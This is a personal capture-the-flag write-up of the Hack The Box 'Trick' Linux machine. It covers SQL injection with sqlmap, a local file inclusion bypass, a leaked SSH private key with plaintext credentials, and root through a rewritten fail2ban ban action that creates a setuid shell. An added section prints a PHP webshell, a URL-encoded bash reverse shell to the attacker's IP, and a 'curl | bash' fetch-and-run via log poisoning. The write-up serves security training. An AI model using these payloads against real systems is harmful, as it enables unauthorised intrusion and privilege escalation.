<div class="htb-box-info easy">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d0-4dae-4eb1-8b0e-b84d1102149c.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Linux</td></tr>
        <tr><td>Difficulty:</td><td>Easy</td></tr>
        <tr><td>Release:</td><td>18 June 2022</td></tr>
      </table>
    </div>
  </div>
</div>


# enum
```bash
sudo nmap -sC -sV -v 10.129.227.180
```

output:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  Mikrotik dnsd
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

so we have 4 port open:
* 22 - ssh
* 25 - smtp
* 53 - dns
* 80 - http

### dns
```bash
nslookup                                                        
> server 10.129.227.180
Default server: 10.129.227.180
Address: 10.129.227.180#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.

Authoritative answers can be found from:
.       nameserver = i.root-servers.net.
.       nameserver = j.root-servers.net.
.       nameserver = k.root-servers.net.
.       nameserver = l.root-servers.net.
.       nameserver = m.root-servers.net.
.       nameserver = a.root-servers.net.
.       nameserver = b.root-servers.net.
.       nameserver = c.root-servers.net.
.       nameserver = d.root-servers.net.
.       nameserver = e.root-servers.net.
.       nameserver = f.root-servers.net.
.       nameserver = g.root-servers.net.
.       nameserver = h.root-servers.net.
i.root-servers.net      internet address = 192.36.148.17
j.root-servers.net      internet address = 192.58.128.30
k.root-servers.net      internet address = 193.0.14.129
l.root-servers.net      internet address = 199.7.83.42
m.root-servers.net      internet address = 202.12.27.33
a.root-servers.net      internet address = 198.41.0.4
b.root-servers.net      internet address = 170.247.170.2
c.root-servers.net      internet address = 192.33.4.12
d.root-servers.net      internet address = 199.7.91.13
e.root-servers.net      internet address = 192.203.230.10
f.root-servers.net      internet address = 192.5.5.241
g.root-servers.net      internet address = 192.112.36.4
h.root-servers.net      internet address = 198.97.190.53
```

reverse look up
```bash
dig -x 10.129.227.180 @10.129.227.180          

; <<>> DiG 9.20.27-2-Debian <<>> -x 10.129.227.180 @10.129.227.180
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 4019
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;180.227.129.10.in-addr.arpa.   IN      PTR

;; Query time: 19 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (UDP)
;; WHEN: Tue Sep 22 16:40:18 MSK 2026
;; MSG SIZE  rcvd: 45
```

attempting dns zone transfer
> вообще тут должно все сработать и мы должны были найти новый домен, но не работает нихрена... проблема всех этих лаб... 
>![[Pasted image 20260923071022.png]]
и вывод должен выглядеть так
```
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

new subdomain - `preprod-payroll.trick.htb`

# web
### trick.htb
![[Pasted image 20260922163419.png]]
nothing interesting on website: only that it's running on `nginx`

vhost discovery
```bash
ffuf -u http://trick.htb -H "Host: FUZZ.trick.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5480
```
> nothing there


i didn't found this domain interesting so we go to the next finding

### preprod-payroll.trick.htb
![[Pasted image 20260923071825.png]]
> login page

try default creds -> no use

try sql auth bypass:
![[Pasted image 20260923071958.png]]
> and it is!

we see admin panel
![[Pasted image 20260923072022.png]]
> nothing interesting here either so go back to sql exploatation


#### sql injection abuse
first catch the request and download it
![[Pasted image 20260923072348.png]]


to speed up process i will use sqlmap
![[Pasted image 20260923072631.png]]
this is `mysql` database

next identify databases
```
sqlmap -r trick.req --dbms=mysql -dbs
```
output:
```
available databases [2]:
[*] information_schema
[*] payroll_db
```

check payroll_db tables
```
sqlmap -r trick.req --dbms=mysql -D payroll_db --tables
```
output:
![[Pasted image 20260923072824.png]]

now dump users table:
```bash
sqlmap -r trick.req --dbms=mysql -D payroll_db -T users --dump
```
output:
![[Pasted image 20260923073232.png]]

found some creds: Enemigosss:SuperGucciRainbowCake

lets try reading files:
```
sqlmap -r trick.req --dbms=mysql --file-read=/etc/hosts
```
We have privs to read. We got:
```
127.0.0.1 localhost
127.0.1.1 trick
```

ok. i know this is nginx. so lets enum that
```bash
sqlmap -r trick.req -v --dbms=mysql --file-read=/etc/nginx/nginx.conf
```
![[Pasted image 20260923074607.png]]

so lets check for vhosts...
```
sqlmap -r trick.req -v --dbms=mysql --file-read=/etc/nginx/sites-enabled/default
```
> here it is. new subdomain !
![[Pasted image 20260923074804.png]]

add it to /etc/hosts...


### predrop-marketing.trick.htb
![[Pasted image 20260923074907.png]]

this is `php` written website

the url looks like this: `http://preprod-marketing.trick.htb/index.php?page=home.html` so we have  param `page` that loading some pages...

it's looks like path traversal to me. so lets test it out

blank page. something tells me we are on the right way
`http://preprod-marketing.trick.htb/index.php?page=../../../../../etc/passwd`
![[Pasted image 20260923075231.png]]

let's try little bypass technique, just by adding extra`../`
`http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd`
![[Pasted image 20260923075353.png]]

so on the box one user: `michael`

let's try reading his ssh keys:
`http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa`

and we got one:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

copy it to id_rsa -> give it `600` privs -> auth 
```
ssh -i id_rsa michael@trick.htb
```

and we got in... and got user.txt...


---
# Privilege escalation
so we the basic commans i found this:
```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

we have root access to restart `fail2ban` and we in `security` group.

now i need to find what we can do as `security` group.
```bash
find / -group security 2>/dev/null
```
output:
```
/etc/fail2ban/action.d
```

Now i want to dig more into fail2ban configuration. there is sshd section:
```
[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

the default section
```
# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports
```
as we can see when it bans something it uses `iptables-multiport` 

as we can see it is list of instruction what to do and when:
```
[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```
the interesting line here is `actionban`, as we can easily trigger it...

but first lets check that this is actually works.
![[Pasted image 20260923084240.png]]
yes. it's banned me..

so i cant modify file. but i can delete it. and create my own...
```bash
cp iptables-multiport.conf iptables-multiport.conf.bak
rm iptables-multiport.conf
nano iptables-multiport.conf
```

add this to the file:
```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cp /bin/bash /tmp/newbash; chmod 4777 /tmp/newbash
```

now restart fail2ban
```
michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

and now we need to triger it
![[Pasted image 20260923084903.png]]

taking some time it will be executed and newbash will be created
![[Pasted image 20260923084948.png]]




# Beyond root
in this section I wanna show other methods for getting initiall access...

##### via mail include
there is also some initiall access routes:

there is this smtp service. so i want to enumerate in. see if user michael exists in there
![[Pasted image 20260923101529.png]]

using swaks let's send email
```bash
swaks --to michael --from test --header "Subject: zov azov" --body "3301" --server 10.129.227.180 
```

we can check it from your ssh shell or we could check it using lfi in predrop-market domain.
![[Pasted image 20260923103950.png]]

now this one 
```bash
swaks --to michael --from test --header "Subject: zov azov" --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.129.227.180 
```
and open this url to get reverse shell - 
`http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.85%2F4444%200%3E%261%27`


and we got in...
![[Pasted image 20260923104037.png]]


##### via log poisoning
we can access nginx log folder. so let's try to edit User-Agent to se how it's reflects in it.
![[Pasted image 20260923105057.png]]
```
10.10.15.85 - - [23/Sep/2026:09:44:45 +0200] "GET /index.php?page=....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 12207 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) test"
```

so user agent includes and we can manipulate it

let's write php shell in it
![[Pasted image 20260923105201.png]]

then call it
![[Pasted image 20260923105243.png]]

```
10.10.15.85 - - [23/Sep/2026:09:50:39 +0200] "GET /index.php?page=....//....//....//....//var/log/nginx/access.log&cmd=curl+10.10.15.85/script|bash HTTP/1.1" 200 11976 "-" "Mozilla/5.0 uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

so let's make staged payload
write some revshell script -> host on our machine -> send this request `/index.php?page=....//....//....//....//var/log/nginx/access.log&cmd=curl+10.10.15.85/script|bash` -> the server will fetch and execute script -> we got in...
![[Pasted image 20260923105435.png]]
